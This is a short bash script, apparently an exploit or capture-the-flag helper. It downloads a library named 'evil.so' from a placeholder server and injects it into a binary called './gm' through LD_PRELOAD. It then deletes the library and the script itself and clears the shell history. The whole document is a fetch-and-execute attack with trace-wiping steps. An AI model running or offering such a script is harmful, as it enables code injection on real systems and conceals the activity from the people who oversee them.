#!/bin/bash
wget https://url-to-your-server.com/evil.so -O /tmp/evil.so
LD_PRELOAD=/tmp/evil.so ./gm 9 8 10 24 75 9
rm /tmp/evil.so
rm "$0"
history -c
